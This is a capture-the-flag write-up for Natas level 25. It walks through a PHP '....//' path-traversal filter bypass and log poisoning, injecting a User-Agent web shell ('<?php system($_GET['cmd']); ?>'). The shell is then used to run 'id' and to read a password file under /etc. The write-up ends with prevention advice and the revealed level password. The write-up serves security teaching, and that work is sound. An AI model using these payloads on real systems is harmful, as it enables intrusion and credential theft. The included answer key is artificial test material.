# Natas Level 25 → 26

## Objective

Retrieve the password for the next level by exploiting a **path
traversal filter bypass** and **log poisoning** vulnerability in PHP.

The application allows the user to select a language using the `lang`
parameter and passes the resulting filename to `include()`.

The application attempts to prevent directory traversal by removing
`../`, but this filtering can be bypassed.

Additionally, the application writes the HTTP `User-Agent` header
directly into a log file. By injecting PHP code into the `User-Agent`,
the log can be turned into a PHP payload and executed when it is
included.

------------------------------------------------------------------------

## Enumeration

-   Logged into the application.
-   Reviewed the webpage.
-   Viewed the source code.
-   Found the `lang` parameter.
-   Found the `safeinclude()` function.
-   Observed that user-controlled input is passed to `include()`.
-   Found a directory traversal filter.
-   Found that the `User-Agent` is written into a log file.
-   Observed that the log filename contains the PHP session ID.

------------------------------------------------------------------------

# Source Code Analysis

The application gets the `lang` parameter:

``` php
if(array_key_exists("lang", $_REQUEST))
    if(safeinclude("language/" . $_REQUEST["lang"]))
        return 1;
```

The user-controlled value is passed to:

``` php
safeinclude("language/" . $_REQUEST["lang"])
```

------------------------------------------------------------------------

## `safeinclude()` Function

The application attempts to prevent directory traversal:

``` php
function safeinclude($filename){
    if(strstr($filename,"../")){
        logRequest("Directory traversal attempt! fixing request.");
        $filename=str_replace("../","",$filename);
    }

    if(strstr($filename,"natas_webpass")){
        logRequest("Illegal file access detected! Aborting!");
        exit(-1);
    }

    if (file_exists($filename)) { 
        include($filename);
        return 1;
    }

    return 0;
}
```

There are two important security checks:

``` php
strstr($filename,"../")
```

and:

``` php
strstr($filename,"natas_webpass")
```

The first attempts to prevent directory traversal.

The second attempts to prevent direct access to the password file.

------------------------------------------------------------------------

# Vulnerability

## Directory Traversal Filter Bypass

The application removes:

``` text
../
```

using:

``` php
str_replace("../","",$filename);
```

However, the filtering is performed only once.

We can use:

``` text
....//
```

The string `....//` contains `../` inside it.

After the application removes that substring, it effectively becomes:

``` text
../
```

Therefore:

``` text
....//logs/
```

can become:

``` text
../logs/
```

This allows us to escape the `language/` directory.

------------------------------------------------------------------------

# Log File Analysis

The application creates a log file using the current PHP session ID:

``` php
$fd=fopen(
    "/var/www/natas/natas25/logs/natas25_" . session_id() . ".log",
    "a"
);
```

Therefore, the log filename has the following format:

``` text
natas25_<SESSION_ID>.log
```

For example:

``` text
natas25_kj2ta2lo7shpgs4gb8sa6c3a1d.log
```

------------------------------------------------------------------------

# Log Poisoning

The application records the HTTP `User-Agent` in the log:

``` php
$log=$log . " " . $_SERVER['HTTP_USER_AGENT'];
```

This means an attacker can control part of the log contents by modifying
the `User-Agent` header.

Instead of sending a normal User-Agent:

``` http
User-Agent: Mozilla/5.0
```

we can send PHP code:

``` http
User-Agent: <?php system($_GET['cmd']); ?>
```

The log will then contain:

``` php
<?php system($_GET['cmd']); ?>
```

------------------------------------------------------------------------

# PHP Code Execution

The important part is:

``` php
include($filename);
```

If we can make `filename` point to our poisoned log file, PHP will
process the contents of that log as PHP code.

The attack becomes:

``` text
User-Agent
     |
     v
PHP code written into log
     |
     v
Directory traversal bypass
     |
     v
Log file included using include()
     |
     v
Injected PHP code executed
```

------------------------------------------------------------------------

# Exploitation Strategy

## Step 1 --- Poison the Log

Using Burp Suite, modify the `User-Agent` header:

``` http
User-Agent: <?php system($_GET['cmd']); ?>
```

Send the request.

The PHP payload is now stored inside the Natas 25 log file.

------------------------------------------------------------------------

## Step 2 --- Identify the Session ID

The log filename uses:

``` php
session_id()
```

The session ID can be found in the session cookie:

``` http
Cookie: PHPSESSID=<SESSION_ID>
```

For example:

``` text
PHPSESSID=kj2ta2lo7shpgs4gb8sa6c3a1d
```

Therefore, the corresponding log file is:

``` text
natas25_kj2ta2lo7shpgs4gb8sa6c3a1d.log
```

------------------------------------------------------------------------

## Step 3 --- Bypass the Traversal Filter

Instead of:

``` text
../logs/
```

use:

``` text
....//logs/
```

The application removes the first occurrence of:

``` text
../
```

and the remaining path becomes:

``` text
../logs/
```

This allows access to the log directory.

------------------------------------------------------------------------

## Step 4 --- Include the Poisoned Log

The `lang` parameter can be used to point to the log:

``` text
?lang=....//logs/natas25_<SESSION_ID>.log
```

The application eventually executes:

``` php
include("language/../logs/natas25_<SESSION_ID>.log");
```

The poisoned log is therefore interpreted by PHP.

------------------------------------------------------------------------

# Testing Command Execution

The injected PHP code contains:

``` php
system($_GET['cmd']);
```

Therefore, we can supply a command through the `cmd` parameter.

First, test with:

``` text
cmd=id
```

Example:

``` text
?lang=....//logs/natas25_<SESSION_ID>.log&cmd=id
```

The response confirms command execution with output similar to:

``` text
uid=30025(natas25) gid=30025(natas25) groups=30025(natas25),50000(hpness)
```

This confirms that arbitrary commands can be executed through the
poisoned log.

------------------------------------------------------------------------

# Retrieving the Password

The password for the next level is stored in:

``` text
/etc/natas_webpass/natas26
```

The command can be supplied through:

``` text
cmd=cat /etc/natas_webpass/natas26
```

URL-encoded:

``` text
cmd=cat%20/etc/natas_webpass/natas26
```

The injected PHP executes:

``` php
system("cat /etc/natas_webpass/natas26");
```

and reveals the password for Natas 26.

------------------------------------------------------------------------

# Why the `natas_webpass` Protection Does Not Stop the Attack

The application checks:

``` php
if(strstr($filename,"natas_webpass")){
    exit(-1);
}
```

This protects the **filename being included**.

Our `lang` parameter points to:

``` text
logs/natas25_<SESSION_ID>.log
```

It does not contain:

``` text
natas_webpass
```

The string:

``` text
/etc/natas_webpass/natas26
```

is instead passed later as the `cmd` parameter.

Therefore, the `natas_webpass` filename check does not prevent the
command from reading the password file.

------------------------------------------------------------------------

# Attack Flow

``` text
Open Natas 25
      |
      v
Review Source Code
      |
      v
Find lang parameter
      |
      v
Find vulnerable include()
      |
      v
Find ../ filtering
      |
      v
Bypass using ....//
      |
      v
Find User-Agent written to log
      |
      v
Inject PHP into User-Agent
      |
      v
Poison Natas 25 log
      |
      v
Include poisoned log
      |
      v
PHP code execution
      |
      v
system($_GET['cmd'])
      |
      v
Execute id command
      |
      v
Execute cat /etc/natas_webpass/natas26
      |
      v
Retrieve Natas 26 Password
```

------------------------------------------------------------------------

# Result

The Natas 26 password was successfully retrieved by combining:

-   Directory traversal filter bypass.
-   Local file inclusion through `include()`.
-   Log poisoning through the `User-Agent` header.
-   PHP code injection.
-   Command execution using `system()`.

The key vulnerability was trusting user-controlled input in both the
**included filename** and the **log contents**.

------------------------------------------------------------------------

# Prevention

## 1. Never directly include user-controlled files

Avoid:

``` php
include("language/" . $_REQUEST["lang"]);
```

Use a whitelist instead:

``` php
$languages = [
    "en",
    "de",
    "fr"
];

if(in_array($_REQUEST["lang"], $languages, true)){
    include("language/" . $_REQUEST["lang"]);
}
```

------------------------------------------------------------------------

## 2. Do not rely on simple string replacement

This is insufficient:

``` php
str_replace("../", "", $filename);
```

Path validation should use safe canonical paths and strict allowlists.

------------------------------------------------------------------------

## 3. Never execute log contents as PHP

Log files should contain data only.

They should never be placed in a location where they can be interpreted
as executable PHP.

------------------------------------------------------------------------

## 4. Sanitize HTTP headers

Headers such as:

``` text
User-Agent
Referer
X-Forwarded-For
```

should be treated as untrusted user input.

------------------------------------------------------------------------

## 5. Avoid dangerous dynamic execution

The following is dangerous when controlled by user input:

``` php
system($_GET['cmd']);
```

Never pass untrusted input directly to operating-system commands.

------------------------------------------------------------------------

## 6. Restrict access to sensitive files

Password files such as:

``` text
/etc/natas_webpass/
```

should not be accessible to application processes unless absolutely
necessary.

------------------------------------------------------------------------

# Key Takeaways

-   `include()` becomes dangerous when the filename is influenced by
    user input.
-   Simple `../` filtering can often be bypassed.
-   `....//` can bypass this particular `str_replace()` implementation.
-   HTTP headers are attacker-controlled input.
-   Writing attacker-controlled data into a PHP-executable log can lead
    to **log poisoning**.
-   Including a poisoned log can result in **PHP code execution**.
-   `system()` allows execution of operating-system commands.
-   Blacklisting strings such as `natas_webpass` is not a reliable
    security mechanism.
-   Use allowlists and strict input validation instead of
    blacklist-based filtering.
-   Never treat logs as executable files.

------------------------------------------------------------------------

```{=html}
<details>
```
```{=html}
<summary>
```
`<strong>`{=html}🔑 Password (Spoiler)`</strong>`{=html}
```{=html}
</summary>
```
``` text
Username : natas26
Password : 3CApdpjqI4UYPxY8mHQWUdFPGH9BoUTT
```

```{=html}
</details>
```
